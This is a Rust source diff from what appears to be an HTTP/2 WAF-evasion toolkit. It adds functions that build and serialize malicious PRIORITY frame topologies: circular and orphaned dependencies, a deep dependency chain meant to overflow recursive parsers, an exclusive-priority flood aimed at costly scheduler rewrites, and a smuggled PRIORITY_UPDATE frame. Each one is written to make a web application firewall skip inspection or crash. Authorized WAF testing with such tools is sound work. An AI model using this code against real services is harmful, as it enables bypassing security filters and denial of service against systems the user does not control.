@@ -907,6 +907,247 @@ pub fn all_evasions(path: &str, host: &str) -> Result<Vec<H2Evasion>, SafetyErro
     Ok(evasions)
 }
 
+// ── #95 SPCA: Single-Packet Connection Abuse / H2 stream-priority topology ──
+
+/// An HTTP/2 PRIORITY frame descriptor.
+///
+/// The HTTP/2 PRIORITY frame (type=0x2) establishes a dependency tree.
+/// When WAFs consume the dependency tree to schedule inspection but origins
+/// reorder streams differently, the inspection/execution split becomes an
+/// evasion surface.
+#[derive(Debug, Clone)]
+pub struct H2PriorityFrame {
+    pub stream_id: u32,
+    pub exclusive: bool,
+    pub depends_on: u32,
+    pub weight: u8,
+    pub description: String,
+}
+
+/// An SPCA attack descriptor — a collection of PRIORITY frames that
+/// craft a specific dependency topology.
+#[derive(Debug, Clone)]
+pub struct SpcaTopology {
+    pub name: &'static str,
+    pub description: &'static str,
+    pub frames: Vec<H2PriorityFrame>,
+    pub target_flaw: H2TargetFlaw,
+}
+
+/// Build a circular priority dependency loop across `n_streams` streams.
+///
+/// In a circular dependency A→B→C→A, RFC 7540 §5.3.1 says the new
+/// dependency MUST be ignored or reshuffled. However several WAF inline
+/// parsers walk the dependency pointer chain for scheduling decisions —
+/// if they loop without a cycle-detection guard they either crash or
+/// silently truncate inspection. Streams 1, 3, 5, … are client-initiated;
+/// stream 0 is the connection control stream.
+///
+/// # Panics (benign)
+/// Does not panic; produces an empty frame set if n_streams < 2.
+#[must_use]
+pub fn spca_circular_priority(n_streams: usize) -> SpcaTopology {
+    if n_streams < 2 {
+        return SpcaTopology {
+            name: "SPCA Circular Priority",
+            description: "Circular dependency loop (n_streams < 2 is no-op)",
+            frames: Vec::new(),
+            target_flaw: H2TargetFlaw::FlowControl,
+        };
+    }
+    // Use odd stream IDs (client-initiated). Build: 1→3, 3→5, …, N→1.
+    let stream_ids: Vec<u32> = (0..n_streams).map(|i| (2 * i + 1) as u32).collect();
+    let mut frames: Vec<H2PriorityFrame> = Vec::with_capacity(n_streams);
+    for i in 0..n_streams {
+        let stream_id = stream_ids[i];
+        let depends_on = stream_ids[(i + 1) % n_streams]; // wraps around
+        frames.push(H2PriorityFrame {
+            stream_id,
+            exclusive: false,
+            depends_on,
+            weight: 16,
+            description: format!(
+                "stream {stream_id} depends on {depends_on} (circular link {}/{})",
+                i + 1,
+                n_streams
+            ),
+        });
+    }
+    SpcaTopology {
+        name: "SPCA Circular Priority",
+        description: "Circular PRIORITY dependency loop — WAF parsers without cycle detection \
+                       loop forever or skip inspection; RFC 7540 §5.3.1 requires reshuffling",
+        frames,
+        target_flaw: H2TargetFlaw::FlowControl,
+    }
+}
+
+/// Build an orphan-dependency PRIORITY frame.
+///
+/// Set `stream_id`'s dependency to a non-existent (closed or idle)
+/// `parent` stream. WAFs that track a live stream table may skip
+/// scheduling the orphaned stream, effectively skipping inspection.
+#[must_use]
+pub fn spca_orphan_dependency(stream_id: u32, parent: u32) -> SpcaTopology {
+    SpcaTopology {
+        name: "SPCA Orphan Dependency",
+        description: "PRIORITY frame pointing at a closed/idle parent stream — \
+                       WAFs that only inspect streams in the live-stream table miss this one",
+        frames: vec![H2PriorityFrame {
+            stream_id,
+            exclusive: false,
+            depends_on: parent,
+            weight: 1,
+            description: format!("stream {stream_id} orphaned to non-existent parent {parent}"),
+        }],
+        target_flaw: H2TargetFlaw::StreamIdValidation,
+    }
+}
+
+/// Exclusive-weight storm — send a cascade of exclusive PRIORITY frames
+/// that each claim to be the sole exclusive child of the root (stream 0).
+///
+/// RFC 7540 §5.3.1: an exclusive flag moves all existing children of the
+/// parent under the new stream. A flood of exclusive PRIORITY frames
+/// forces O(n²) tree rewrites on the WAF's priority scheduler. This is
+/// the HTTP/2 PRIORITY Flood technique (CVE-2023-44487 adjacent).
+/// Payload streams are interleaved so the expensive tree rewrites happen
+/// in the same pass as the attack payload evaluation.
+#[must_use]
+pub fn spca_exclusive_weight_storm() -> SpcaTopology {
+    let mut frames: Vec<H2PriorityFrame> = Vec::new();
+    // 16 exclusive PRIORITY frames → 16 tree rewrites per pass.
+    // Every second frame is weight=0 (implementation-defined, often
+    // treated as weight=1 or rejected — both behaviours are interesting).
+    for i in 0u32..16 {
+        let stream_id = 2 * i + 1; // odd client-initiated
+        frames.push(H2PriorityFrame {
+            stream_id,
+            exclusive: true,
+            depends_on: 0, // root
+            weight: if i % 2 == 0 { 0 } else { 255 },
+            description: format!(
+                "exclusive claim on root, weight={}, storm frame {}/16",
+                if i % 2 == 0 { 0 } else { 255 },
+                i + 1
+            ),
+        });
+    }
+    SpcaTopology {
+        name: "SPCA Exclusive Weight Storm",
+        description: "16 exclusive PRIORITY frames targeting root — forces O(n²) tree rewrites \
+                       in WAF schedulers; alternating weight=0 tests implementation-defined behaviour",
+        frames,
+        target_flaw: H2TargetFlaw::FlowControl,
+    }
+}
+
+/// Build a priority dependency tree with `depth` levels.
+///
+/// Very deep trees expose WAF parsers that recurse without a depth cap.
+/// RFC 7540 does not specify a maximum dependency depth.
+#[must_use]
+pub fn spca_deep_dependency_chain(depth: usize) -> SpcaTopology {
+    let depth = depth.max(1).min(512); // cap at 512 to stay sane on the wire
+    let mut frames: Vec<H2PriorityFrame> = Vec::with_capacity(depth);
+    let mut parent: u32 = 0;
+    for i in 0..depth {
+        let stream_id = (2 * i + 1) as u32;
+        frames.push(H2PriorityFrame {
+            stream_id,
+            exclusive: false,
+            depends_on: parent,
+            weight: 16,
+            description: format!("stream {stream_id} → parent {parent}, depth {}", i + 1),
+        });
+        parent = stream_id;
+    }
+    SpcaTopology {
+        name: "SPCA Deep Dependency Chain",
+        description: "Linear dependency chain at maximum depth — triggers stack overflows \
+                       in recursive WAF priority walkers",
+        frames,
+        target_flaw: H2TargetFlaw::FlowControl,
+    }
+}
+
+/// PRIORITY_UPDATE frame (RFC 9218) smuggled over HTTP/2.
+///
+/// HTTP/2 does not define PRIORITY_UPDATE (that's HTTP/3), but some
+/// proxies that speak both may pass unknown frame types through.
+/// Returns the raw bytes of a synthetic PRIORITY_UPDATE frame.
+/// Frame type = 0x10 (IETF provisional), flags = 0x00.
+#[must_use]
+pub fn spca_priority_update_frame(stream_id: u32, urgency: u8, incremental: bool) -> Vec<u8> {
+    // PRIORITY_UPDATE payload: "u=<urgency>,i" / "u=<urgency>"
+    let payload = if incremental {
+        format!("u={urgency},i")
+    } else {
+        format!("u={urgency}")
+    };
+    let payload_bytes = payload.as_bytes();
+    let length = payload_bytes.len() as u32 + 4; // +4 for the stream-id field
+    let mut frame = Vec::with_capacity(9 + length as usize);
+    // 3-byte length
+    frame.push((length >> 16) as u8);
+    frame.push((length >> 8) as u8);
+    frame.push(length as u8);
+    // type = 0x10 (PRIORITY_UPDATE provisional)
+    frame.push(0x10);
+    // flags = 0
+    frame.push(0x00);
+    // 4-byte stream id (the stream being prioritized)
+    let sid = stream_id & 0x7FFF_FFFF;
+    frame.push((sid >> 24) as u8);
+    frame.push((sid >> 16) as u8);
+    frame.push((sid >> 8) as u8);
+    frame.push(sid as u8);
+    // prioritized stream id (4 bytes, the header field)
+    frame.push((sid >> 24) as u8);
+    frame.push((sid >> 16) as u8);
+    frame.push((sid >> 8) as u8);
+    frame.push(sid as u8);
+    frame.extend_from_slice(payload_bytes);
+    frame
+}
+
+/// Serialize an H2PriorityFrame to its wire representation.
+///
+/// PRIORITY frame format (RFC 7540 §6.3):
+/// - 3 bytes length = 5
+/// - 1 byte type = 0x02
+/// - 1 byte flags = 0x00
+/// - 4 bytes stream id
+/// - 1 bit exclusive + 31 bits dependency stream id
+/// - 1 byte weight (0–255, actual weight = value + 1)
+#[must_use]
+pub fn priority_frame_to_bytes(f: &H2PriorityFrame) -> Vec<u8> {
+    let mut out = Vec::with_capacity(14);
+    // Length = 5
+    out.extend_from_slice(&[0x00, 0x00, 0x05]);
+    // Type = PRIORITY (0x02)
+    out.push(0x02);
+    // Flags = 0x00
+    out.push(0x00);
+    // Stream ID (31 bits, MSB reserved)
+    let sid = f.stream_id & 0x7FFF_FFFF;
+    out.push((sid >> 24) as u8);
+    out.push((sid >> 16) as u8);
+    out.push((sid >> 8) as u8);
+    out.push(sid as u8);
+    // Exclusive flag (1 bit) + dependency stream id (31 bits)
+    let dep = f.depends_on & 0x7FFF_FFFF;
+    let exclusive_bit: u32 = if f.exclusive { 0x8000_0000 } else { 0 };
+    let dep_field = exclusive_bit | dep;
+    out.push((dep_field >> 24) as u8);
+    out.push((dep_field >> 16) as u8);
+    out.push((dep_field >> 8) as u8);
+    out.push(dep_field as u8);
+    // Weight
+    out.push(f.weight);
+    out
+}
+
 #[cfg(test)]
 #[path = "h2_evasion_tests.rs"]
 mod tests;
